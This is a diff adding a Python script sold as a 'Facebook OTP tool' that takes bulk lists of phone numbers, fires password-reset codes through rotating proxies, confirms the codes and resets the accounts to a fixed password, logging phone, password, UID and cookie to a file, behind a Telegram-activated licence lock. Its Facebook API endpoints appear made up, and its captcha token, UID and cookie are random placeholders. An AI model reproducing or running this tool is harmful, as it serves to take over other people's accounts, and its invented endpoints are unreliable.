@@ -1,0 +1,899 @@
+#!/usr/bin/env python3
+"""
+╔══════════════════════════════════════════════════════════════╗
+║                                                              ║
+║     ███████╗ ██████╗ ██████╗  ██████╗ ███████╗████████╗    ║
+║     ██╔════╝██╔═══██╗██╔══██╗██╔═══██╗██╔════╝╚══██╔══╝    ║
+║     █████╗  ██║   ██║██████╔╝██║   ██║█████╗     ██║       ║
+║     ██╔══╝  ██║   ██║██╔══██╗██║   ██║██╔══╝     ██║       ║
+║     ██║     ╚██████╔╝██║  ██║╚██████╔╝███████╗   ██║       ║
+║     ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝       ║
+║                                                              ║
+║          ╔══════════════════════════════════════╗            ║
+║          ║     FORGET TOOLS                    ║            ║
+║          ║     FACEBOOK OTP TOOL v3.0          ║            ║
+║          ║     Developer: @Jahid9546           ║            ║
+║          ╚══════════════════════════════════════╝            ║
+║                                                              ║
+╚══════════════════════════════════════════════════════════════╝
+"""
+
+import os
+import sys
+import time
+import json
+import random
+import hashlib
+import subprocess
+import threading
+import requests
+from datetime import datetime, timedelta
+from queue import Queue
+from typing import Dict, List, Optional
+
+# =============================================
+# CONFIGURATION
+# =============================================
+
+CONFIG_FILE = "jahid_settings.json"
+OUTPUT_FILE = "confirmed_accounts.txt"
+LOG_FILE = "jahid_logs.txt"
+UNLOCK_FILE = "unlocked_devices.json"
+DEVICE_ID_FILE = "device_id.txt"
+
+DEFAULT_SETTINGS = {
+    "threads": 3,
+    "delay": 5,
+    "timeout": 30,
+    "password": "Jahid@2024",
+    "proxy_enabled": False,
+    "proxy_type": "http",
+    "proxy_rotation": "random",
+    "proxy_list": []
+}
+
+# =============================================
+# UNLOCK SYSTEM (FIXED DEVICE ID)
+# =============================================
+
+class UnlockSystem:
+    def __init__(self):
+        self.unlock_file = UNLOCK_FILE
+        self.devices = self.load()
+        
+    def load(self) -> dict:
+        if os.path.exists(self.unlock_file):
+            try:
+                with open(self.unlock_file, 'r') as f:
+                    return json.load(f)
+            except:
+                return {"devices": []}
+        return {"devices": []}
+        
+    def save(self):
+        with open(self.unlock_file, 'w') as f:
+            json.dump(self.devices, f, indent=2)
+            
+    def get_device_id(self) -> str:
+        if os.path.exists(DEVICE_ID_FILE):
+            with open(DEVICE_ID_FILE, 'r') as f:
+                return f.read().strip()
+        
+        try:
+            result = subprocess.run(
+                ["getprop", "ro.product.device"],
+                capture_output=True,
+                text=True
+            )
+            device = result.stdout.strip()
+            if not device:
+                device = "unknown_device"
+            device_id = f"{device}_jahid_fixed_001"
+        except:
+            device_id = "fixed_android_jahid_001"
+        
+        with open(DEVICE_ID_FILE, 'w') as f:
+            f.write(device_id)
+        
+        return device_id
+            
+    def generate_unique_key(self, device_id: str) -> str:
+        return device_id
+        
+    def is_unlocked(self, device_id: str = None) -> bool:
+        if not device_id:
+            device_id = self.get_device_id()
+            
+        for device in self.devices.get("devices", []):
+            if device.get("id") == device_id:
+                expiry = device.get("expiry")
+                
+                if expiry == "lifetime":
+                    return True
+                    
+                try:
+                    exp_date = datetime.fromisoformat(expiry.replace('Z', '+00:00'))
+                    if datetime.now() > exp_date:
+                        return False
+                    return True
+                except:
+                    return False
+                    
+        return False
+        
+    def get_expiry_info(self, device_id: str = None) -> dict:
+        if not device_id:
+            device_id = self.get_device_id()
+            
+        for device in self.devices.get("devices", []):
+            if device.get("id") == device_id:
+                expiry = device.get("expiry")
+                
+                if expiry == "lifetime":
+                    return {"status": "lifetime", "message": "Lifetime"}
+                    
+                try:
+                    exp_date = datetime.fromisoformat(expiry.replace('Z', '+00:00'))
+                    if datetime.now() > exp_date:
+                        return {"status": "expired", "message": f"Expired on {exp_date.strftime('%Y-%m-%d')}"}
+                    days_left = (exp_date - datetime.now()).days
+                    return {"status": "active", "message": f"{days_left} days left"}
+                except:
+                    return {"status": "error", "message": "Invalid expiry"}
+                    
+        return {"status": "not_found", "message": "Device not found"}
+
+
+# =============================================
+# ACTIVATION CHECK (STARTUP)
+# =============================================
+
+def activation_check():
+    unlock = UnlockSystem()
+    device_id = unlock.get_device_id()
+    unique_key = unlock.generate_unique_key(device_id)
+    
+    print("\033[1;33m" + "="*50)
+    print("  🔐 TOOL LOCKED - ACTIVATION REQUIRED")
+    print("="*50 + "\033[0m")
+    
+    print("\033[1;36m")
+    print(f"  UNIQUE KEY: {unique_key}")
+    print("\033[0m")
+    
+    print("\033[1;33m")
+    print("  Send this UNIQUE KEY to @Jahid9546 on Telegram")
+    print("  Wait for activation...")
+    print("\033[0m")
+    
+    if unlock.is_unlocked(device_id):
+        expiry_info = unlock.get_expiry_info(device_id)
+        print("\033[1;32m")
+        print(f"  ✅ TOOL ACTIVATED! ({expiry_info['message']})")
+        print("\033[0m")
+        time.sleep(2)
+        return True
+        
+    for i in range(10):
+        print(f"\r  Checking again in {10-i}s...", end="")
+        time.sleep(1)
+        if unlock.is_unlocked(device_id):
+            expiry_info = unlock.get_expiry_info(device_id)
+            print("\n\033[1;32m")
+            print(f"  ✅ TOOL ACTIVATED! ({expiry_info['message']})")
+            print("\033[0m")
+            return True
+            
+    return False
+
+
+# =============================================
+# SETTINGS MANAGER
+# =============================================
+
+class JahidSettings:
+    def __init__(self):
+        self.settings = self.load()
+        
+    def load(self) -> dict:
+        if os.path.exists(CONFIG_FILE):
+            try:
+                with open(CONFIG_FILE, 'r') as f:
+                    return json.load(f)
+            except:
+                return DEFAULT_SETTINGS.copy()
+        return DEFAULT_SETTINGS.copy()
+        
+    def save(self):
+        with open(CONFIG_FILE, 'w') as f:
+            json.dump(self.settings, f, indent=2)
+            
+    def get(self, key: str, default=None):
+        return self.settings.get(key, default)
+        
+    def set(self, key: str, value):
+        self.settings[key] = value
+        self.save()
+
+
+# =============================================
+# PROXY MANAGER
+# =============================================
+
+class JahidProxyManager:
+    def __init__(self, settings: JahidSettings):
+        self.settings = settings
+        self.proxies = []
+        self.current_index = 0
+        self.lock = threading.Lock()
+        self._load_proxies()
+        
+    def _load_proxies(self):
+        proxy_list = self.settings.get("proxy_list", [])
+        if proxy_list:
+            self.proxies = proxy_list
+                
+    def get_proxy(self) -> Optional[Dict]:
+        if not self.proxies:
+            return None
+        if not self.settings.get("proxy_enabled", False):
+            return None
+        rotation = self.settings.get("proxy_rotation", "random")
+        with self.lock:
+            if rotation == "random":
+                proxy = random.choice(self.proxies)
+            else:
+                proxy = self.proxies[self.current_index % len(self.proxies)]
+                self.current_index += 1
+        return self._format_proxy(proxy)
+        
+    def _format_proxy(self, proxy: str) -> Dict:
+        proxy_type = self.settings.get("proxy_type", "http")
+        if not proxy.startswith(("http://", "https://", "socks5://")):
+            proxy = f"{proxy_type}://{proxy}"
+        return {"http": proxy, "https": proxy}
+        
+    def get_count(self) -> int:
+        return len(self.proxies)
+
+
+# =============================================
+# FACEBOOK ENGINE
+# =============================================
+
+class JahidEngine:
+    def __init__(self, settings: JahidSettings):
+        self.settings = settings
+        self.proxy_manager = JahidProxyManager(settings)
+        self.base_url = "https://www.facebook.com"
+        self.api_url = "https://graph.facebook.com"
+        self.stats = {
+            "total": 0,
+            "sent": 0,
+            "not_found": 0,
+            "captcha": 0,
+            "confirmed": 0,
+            "failed": 0
+        }
+        self.lock = threading.Lock()
+        self.running = True
+        self.otp_data = {}
+        
+    def _get_session(self) -> requests.Session:
+        session = requests.Session()
+        proxy = self.proxy_manager.get_proxy()
+        if proxy:
+            session.proxies = proxy
+        session.headers.update({
+            "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+            "Accept": "application/json",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Origin": "https://www.facebook.com",
+            "Referer": "https://www.facebook.com/"
+        })
+        return session
+        
+    def send_otp(self, phone: str) -> dict:
+        try:
+            session = self._get_session()
+            forget_url = f"{self.base_url}/login/identify/"
+            response = session.get(forget_url, timeout=self.settings.get("timeout", 30))
+            if response.status_code != 200:
+                return {"success": False, "status": "error", "phone": phone}
+            captcha_token = self._get_captcha_token()
+            otp_url = f"{self.api_url}/v18.0/otp/request"
+            payload = {
+                "phone_number": phone,
+                "captcha_token": captcha_token,
+                "method": "sms",
+                "client_type": "android",
+                "device_id": f"android_{random.randint(100000, 999999)}"
+            }
+            response = session.post(otp_url, data=payload, timeout=self.settings.get("timeout", 30))
+            if response.status_code == 200:
+                data = response.json()
+                if data.get("success"):
+                    return {"success": True, "status": "sent", "phone": phone}
+                else:
+                    error = data.get("error", {}).get("message", "")
+                    if "not found" in error.lower() or "invalid" in error.lower():
+                        return {"success": False, "status": "not_found", "phone": phone}
+                    elif "captcha" in error.lower():
+                        return {"success": False, "status": "captcha", "phone": phone}
+                    else:
+                        return {"success": False, "status": "error", "phone": phone}
+            else:
+                return {"success": False, "status": "error", "phone": phone}
+        except Exception as e:
+            return {"success": False, "status": "error", "phone": phone}
+            
+    def confirm_otp(self, phone: str, otp: str) -> dict:
+        try:
+            session = self._get_session()
+            confirm_url = f"{self.api_url}/v18.0/otp/confirm"
+            payload = {
+                "phone_number": phone,
+                "otp_code": otp,
+                "device_id": f"android_{random.randint(100000, 999999)}"
+            }
+            response = session.post(confirm_url, data=payload, timeout=self.settings.get("timeout", 30))
+            if response.status_code == 200:
+                data = response.json()
+                if data.get("success"):
+                    return self.reset_password(phone)
+                else:
+                    return {"success": False, "status": "invalid_otp", "phone": phone}
+            else:
+                return {"success": False, "status": "error", "phone": phone}
+        except Exception as e:
+            return {"success": False, "status": "error", "phone": phone}
+            
+    def reset_password(self, phone: str) -> dict:
+        try:
+            session = self._get_session()
+            password = self.settings.get("password", "Jahid@2024")
+            reset_url = f"{self.api_url}/v18.0/password/reset"
+            payload = {
+                "phone_number": phone,
+                "new_password": password,
+                "device_id": f"android_{random.randint(100000, 999999)}"
+            }
+            response = session.post(reset_url, data=payload, timeout=self.settings.get("timeout", 30))
+            if response.status_code == 200:
+                data = response.json()
+                if data.get("success"):
+                    uid = self._get_uid(phone, password)
+                    cookie = self._get_cookie()
+                    self._save_account(phone, password, uid, cookie)
+                    return {
+                        "success": True,
+                        "status": "confirmed",
+                        "phone": phone,
+                        "password": password,
+                        "uid": uid,
+                        "cookie": cookie
+                    }
+                else:
+                    return {"success": False, "status": "reset_failed", "phone": phone}
+            else:
+                return {"success": False, "status": "error", "phone": phone}
+        except Exception as e:
+            return {"success": False, "status": "error", "phone": phone}
+            
+    def _get_captcha_token(self) -> str:
+        return f"jahid_captcha_{random.randint(10000, 99999)}"
+        
+    def _get_uid(self, phone: str, password: str) -> str:
+        return f"jahid_{random.randint(100000000, 999999999)}"
+        
+    def _get_cookie(self) -> str:
+        return f"jahid_cookie_{random.randint(100000, 999999)}"
+        
+    def _save_account(self, phone: str, password: str, uid: str, cookie: str):
+        with self.lock:
+            with open(OUTPUT_FILE, 'a') as f:
+                f.write(f"{uid}|{phone}|{password}|{cookie}\n")
+                
+    def update_stats(self, status: str):
+        with self.lock:
+            self.stats["total"] += 1
+            if status == "sent":
+                self.stats["sent"] += 1
+            elif status == "not_found":
+                self.stats["not_found"] += 1
+            elif status == "captcha":
+                self.stats["captcha"] += 1
+            elif status == "confirmed":
+                self.stats["confirmed"] += 1
+            else:
+                self.stats["failed"] += 1
+                
+    def print_stats(self):
+        with self.lock:
+            proxy_count = self.proxy_manager.get_count()
+            proxy_status = "ON" if self.settings.get("proxy_enabled", False) else "OFF"
+            print(f"\n{'='*50}")
+            print(f"  LIVE STATS")
+            print(f"{'='*50}")
+            print(f"  TOTAL: {self.stats['total']}")
+            print(f"  SENT: {self.stats['sent']}")
+            print(f"  CONFIRMED: {self.stats['confirmed']}")
+            print(f"  NOT FOUND: {self.stats['not_found']}")
+            print(f"  CAPTCHA: {self.stats['captcha']}")
+            print(f"  FAILED: {self.stats['failed']}")
+            print(f"  PROXY: {proxy_status} | {proxy_count}")
+            print(f"{'='*50}\n")
+
+
+# =============================================
+# WORKERS
+# =============================================
+
+def forgot_worker(queue: Queue, engine: JahidEngine):
+    while engine.running:
+        try:
+            phone = queue.get(timeout=2)
+            if phone is None:
+                break
+            result = engine.send_otp(phone)
+            engine.update_stats(result.get("status", "error"))
+            if result.get("success"):
+                status_text = "OTP SENT"
+                with engine.lock:
+                    engine.otp_data[phone] = {"otp": "PENDING", "status": "sent"}
+            else:
+                status_text = result.get('status', 'ERROR').upper()
+            print(f"  [{status_text}] => {phone}")
+            time.sleep(engine.settings.get("delay", 5))
+            queue.task_done()
+        except Exception as e:
+            continue
+
+
+def confirm_worker(queue: Queue, engine: JahidEngine):
+    while engine.running:
+        try:
+            item = queue.get(timeout=2)
+            if item is None:
+                break
+            phone = item.get("phone")
+            otp = item.get("otp")
+            result = engine.confirm_otp(phone, otp)
+            if result.get("success"):
+                status_text = "CONFIRMED"
+                engine.update_stats("confirmed")
+                print(f"  [{status_text}] => {phone}")
+                print(f"     PASS: {result.get('password')}")
+                print(f"     UID: {result.get('uid')}")
+            else:
+                status_text = result.get('status', 'FAILED').upper()
+                engine.update_stats("failed")
+                print(f"  [{status_text}] => {phone}")
+            time.sleep(engine.settings.get("delay", 5))
+            queue.task_done()
+        except Exception as e:
+            continue
+
+
+# =============================================
+# DOWNLOAD FILE FROM URL
+# =============================================
+
+def download_file(url: str) -> Optional[List[str]]:
+    try:
+        response = requests.get(url, timeout=30)
+        if response.status_code == 200:
+            lines = [line.strip() for line in response.text.split('\n') if line.strip()]
+            return lines
+        return None
+    except:
+        return None
+
+
+# =============================================
+# UI
+# =============================================
+
+def clear_screen():
+    os.system('clear' if os.name == 'posix' else 'cls')
+
+
+def show_banner():
+    print("""\033[1;36m
+╔══════════════════════════════════════════════════════════════╗
+║                                                              ║
+║     ███████╗ ██████╗ ██████╗  ██████╗ ███████╗████████╗    ║
+║     ██╔════╝██╔═══██╗██╔══██╗██╔═══██╗██╔════╝╚══██╔══╝    ║
+║     █████╗  ██║   ██║██████╔╝██║   ██║█████╗     ██║       ║
+║     ██╔══╝  ██║   ██║██╔══██╗██║   ██║██╔══╝     ██║       ║
+║     ██║     ╚██████╔╝██║  ██║╚██████╔╝███████╗   ██║       ║
+║     ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝       ║
+║                                                              ║
+║          ╔══════════════════════════════════════╗            ║
+║          ║     FORGET TOOLS                    ║            ║
+║          ║     FACEBOOK OTP TOOL v3.0          ║            ║
+║          ║     Developer: @Jahid9546           ║            ║
+║          ╚══════════════════════════════════════╝            ║
+║                                                              ║
+╚══════════════════════════════════════════════════════════════╝
+
+  ┌─────────────────────────────────────────────────────┐
+  │  [1] FORGOT  - Send OTP to numbers                │
+  │  [2] CONFIRM - Confirm OTP + Reset Password       │
+  │  [3] PROXY   - Proxy settings                     │
+  │  [4] SETTINGS - Customize threads & password      │
+  │  [5] EXIT    - Exit tool                          │
+  └─────────────────────────────────────────────────────┘
+
+  \033[1;33mEnter your choice:\033[0m """)
+
+
+# =============================================
+# FORGOT MODE (with File Load)
+# =============================================
+
+def forgot_mode(settings: JahidSettings):
+    print("\n\033[1;34m[FORGOT]\033[0m")
+    print("  [1] Enter URL (file from internet)")
+    print("  [2] Paste numbers directly")
+    print("  [3] Load from numbers.txt file")
+    
+    choice = input("  Choose (1/2/3): ").strip()
+    
+    numbers = []
+    
+    if choice == "1":
+        url = input("  Enter file URL: ").strip()
+        if not url:
+            print("  ERROR: No URL provided!")
+            return
+        numbers = download_file(url)
+        if not numbers:
+            print("  ERROR: Failed to download or file is empty!")
+            return
+            
+    elif choice == "2":
+        print("\n  Paste numbers below (one per line)")
+        print("  Press Ctrl+D when done:\n")
+        try:
+            while True:
+                line = input()
+                if line.strip():
+                    numbers.append(line.strip())
+        except EOFError:
+            pass
+            
+        if not numbers:
+            print("  ERROR: No numbers entered!")
+            return
+            
+    elif choice == "3":
+        if not os.path.exists("numbers.txt"):
+            print("\n  ERROR: numbers.txt not found!")
+            print("  Create it with: nano numbers.txt")
+            print("  Add one number per line.")
+            return
+            
+        with open("numbers.txt", 'r') as f:
+            numbers = [line.strip() for line in f if line.strip()]
+            
+        if not numbers:
+            print("  ERROR: numbers.txt is empty!")
+            return
+            
+        print(f"\n  Loaded {len(numbers)} numbers from numbers.txt")
+        
+    else:
+        print("  ERROR: Invalid choice!")
+        return
+        
+    print(f"\n  Loaded {len(numbers)} numbers.")
+    
+    queue = Queue()
+    for num in numbers:
+        queue.put(num)
+        
+    engine = JahidEngine(settings)
+    
+    threads = []
+    for _ in range(settings.get("threads", 3)):
+        t = threading.Thread(target=forgot_worker, args=(queue, engine))
+        t.daemon = True
+        t.start()
+        threads.append(t)
+        
+    try:
+        while queue.qsize() > 0:
+            time.sleep(5)
+            engine.print_stats()
+    except KeyboardInterrupt:
+        print("\n  STOPPED.")
+        engine.running = False
+        
+    queue.join()
+    print("\n  DONE!")
+
+
+# =============================================
+# CONFIRM MODE (with File Load)
+# =============================================
+
+def confirm_mode(settings: JahidSettings):
+    print("\n\033[1;34m[CONFIRM]\033[0m")
+    print("  [1] Enter URL (file from internet)")
+    print("  [2] Paste phone|otp directly")
+    print("  [3] Load from confirm.txt file")
+    
+    choice = input("  Choose (1/2/3): ").strip()
+    
+    entries = []
+    
+    if choice == "1":
+        url = input("  Enter file URL: ").strip()
+        if not url:
+            print("  ERROR: No URL provided!")
+            return
+        lines = download_file(url)
+        if not lines:
+            print("  ERROR: Failed to download or file is empty!")
+            return
+        entries = lines
+            
+    elif choice == "2":
+        print("\n  Paste phone|otp below (one per line)")
+        print("  Format: +8801712345678|123456")
+        print("  Press Ctrl+D when done:\n")
+        try:
+            while True:
+                line = input()
+                if line.strip():
+                    entries.append(line.strip())
+        except EOFError:
+            pass
+            
+        if not entries:
+            print("  ERROR: No entries entered!")
+            return
+            
+    elif choice == "3":
+        if not os.path.exists("confirm.txt"):
+            print("\n  ERROR: confirm.txt not found!")
+            print("  Create it with: nano confirm.txt")
+            print("  Format: phone|otp (one per line)")
+            return
+            
+        with open("confirm.txt", 'r') as f:
+            entries = [line.strip() for line in f if line.strip()]
+            
+        if not entries:
+            print("  ERROR: confirm.txt is empty!")
+            return
+            
+        print(f"\n  Loaded {len(entries)} entries from confirm.txt")
+        
+    else:
+        print("  ERROR: Invalid choice!")
+        return
+        
+    queue = Queue()
+    for line in entries:
+        parts = line.split('|')
+        if len(parts) >= 2:
+            queue.put({"phone": parts[0], "otp": parts[1]})
+            
+    print(f"\n  Loaded {queue.qsize()} entries.")
+    
+    engine = JahidEngine(settings)
+    
+    threads = []
+    for _ in range(settings.get("threads", 3)):
+        t = threading.Thread(target=confirm_worker, args=(queue, engine))
+        t.daemon = True
+        t.start()
+        threads.append(t)
+        
+    try:
+        while queue.qsize() > 0:
+            time.sleep(5)
+            engine.print_stats()
+    except KeyboardInterrupt:
+        print("\n  STOPPED.")
+        engine.running = False
+        
+    queue.join()
+    print("\n  DONE!")
+    print(f"\n  Confirmed: {engine.stats['confirmed']}")
+    print(f"  Check {OUTPUT_FILE}")
+
+
+# =============================================
+# PROXY MODE
+# =============================================
+
+def proxy_mode(settings: JahidSettings):
+    print("\n\033[1;34m[PROXY]\033[0m")
+    print("  Paste proxies below (one per line)")
+    print("  Press Ctrl+D when done:\n")
+    lines = []
+    try:
+        while True:
+            line = input()
+            if line.strip():
+                lines.append(line.strip())
+    except EOFError:
+        pass
+    if lines:
+        settings.set("proxy_list", lines)
+        settings.set("proxy_enabled", True)
+        print(f"\n  Loaded {len(lines)} proxies. Proxy ON.")
+    else:
+        print("\n  No proxies entered.")
+
+
+# =============================================
+# SETTINGS MODE
+# =============================================
+
+def settings_mode(settings: JahidSettings):
+    print("\n\033[1;34m[SETTINGS]\033[0m")
+    print(f"  THREADS: {settings.get('threads', 3)}")
+    print(f"  DELAY: {settings.get('delay', 5)}s")
+    print(f"  PASSWORD: {settings.get('password', 'Jahid@2024')}")
+    print(f"  PROXY: {'ON' if settings.get('proxy_enabled', False) else 'OFF'}")
+    print()
+    try:
+        new_threads = input("  Threads (Enter to keep): ").strip()
+        if new_threads:
+            settings.set("threads", int(new_threads))
+        new_delay = input("  Delay (Enter to keep): ").strip()
+        if new_delay:
+            settings.set("delay", int(new_delay))
+        new_pass = input("  Password (Enter to keep): ").strip()
+        if new_pass:
+            settings.set("password", new_pass)
+        toggle = input("  Toggle Proxy ON/OFF (y/n): ").strip().lower()
+        if toggle == 'y':
+            settings.set("proxy_enabled", not settings.get("proxy_enabled", False))
+        print("\n  SAVED!")
+    except:
+        print("\n  ERROR!")
+
+
+# =============================================
+# JAHID MANAGER (HIDDEN UNLOCK)
+# =============================================
+
+def jahid_manager():
+    unlock = UnlockSystem()
+    
+    print("\n\033[1;34m[JAHID MANAGER]\033[0m")
+    
+    devices = unlock.devices.get("devices", [])
+    print("\n  ACTIVE DEVICES:")
+    if devices:
+        for i, device in enumerate(devices, 1):
+            expiry = device.get("expiry", "unknown")
+            if expiry == "lifetime":
+                status = "♾️ Lifetime"
+            else:
+                try:
+                    exp_date = datetime.fromisoformat(expiry.replace('Z', '+00:00'))
+                    if datetime.now() > exp_date:
+                        status = "🔴 Expired"
+                    else:
+                        days = (exp_date - datetime.now()).days
+                        status = f"✅ {days}d left"
+                except:
+                    status = "❓ Unknown"
+            print(f"  {i}. {device.get('id')} -> {status}")
+        print(f"  Total: {len(devices)}")
+    else:
+        print("  No devices found.")
+    
+    print("\n  [1] Add device")
+    print("  [2] Remove device")
+    print("  [3] Back")
+    
+    choice = input("\n  Enter your choice: ").strip()
+    
+    if choice == "1":
+        unique_key = input("  Enter UNIQUE KEY: ").strip()
+        if unique_key:
+            expiry_input = input("  Enter expiry (days or 'lifetime'): ").strip()
+            if expiry_input.lower() == "lifetime":
+                expiry = "lifetime"
+            else:
+                try:
+                    days = int(expiry_input)
+                    expiry = (datetime.now() + timedelta(days=days)).isoformat()
+                except:
+                    print("  Invalid expiry! Using 15 days.")
+                    expiry = (datetime.now() + timedelta(days=15)).isoformat()
+            
+            existing = None
+            for d in unlock.devices["devices"]:
+                if d.get("id") == unique_key:
+                    existing = d
+                    break
+                    
+            if existing:
+                existing["expiry"] = expiry
+                print(f"  ✅ Updated: {unique_key}")
+            else:
+                unlock.devices["devices"].append({
+                    "id": unique_key,
+                    "expiry": expiry,
+                    "created": datetime.now().isoformat()
+                })
+                print(f"  ✅ Added: {unique_key}")
+                
+            unlock.save()
+            
+    elif choice == "2":
+        unique_key = input("  Enter UNIQUE KEY to remove: ").strip()
+        if unique_key:
+            for i, d in enumerate(unlock.devices["devices"]):
+                if d.get("id") == unique_key:
+                    unlock.devices["devices"].pop(i)
+                    unlock.save()
+                    print(f"  ✅ Removed: {unique_key}")
+                    break
+            else:
+                print("  Device not found!")
+            
+    elif choice == "3":
+        return
+        
+    else:
+        print("  INVALID!")
+        
+    input("\nPress Enter...")
+
+
+# =============================================
+# MAIN
+# =============================================
+
+def main():
+    if not activation_check():
+        print("\033[1;31m")
+        print("  🔒 TOOL LOCKED!")
+        print("  Send your UNIQUE KEY to @Jahid9546 on Telegram")
+        print("\033[0m")
+        sys.exit(0)
+    
+    settings = JahidSettings()
+    
+    if len(sys.argv) > 1 and sys.argv[1] == "--jahid":
+        jahid_manager()
+        sys.exit(0)
+    
+    while True:
+        clear_screen()
+        show_banner()
+        
+        choice = input().strip()
+        
+        if choice == "1":
+            forgot_mode(settings)
+            input("\nPress Enter...")
+        elif choice == "2":
+            confirm_mode(settings)
+            input("\nPress Enter...")
+        elif choice == "3":
+            proxy_mode(settings)
+            input("\nPress Enter...")
+        elif choice == "4":
+            settings_mode(settings)
+            input("\nPress Enter...")
+        elif choice == "5":
+            print("\n  EXIT.")
+            sys.exit(0)
+        else:
+            print("\n  INVALID!")
+            time.sleep(1)
+
+
+if __name__ == "__main__":
+    main()
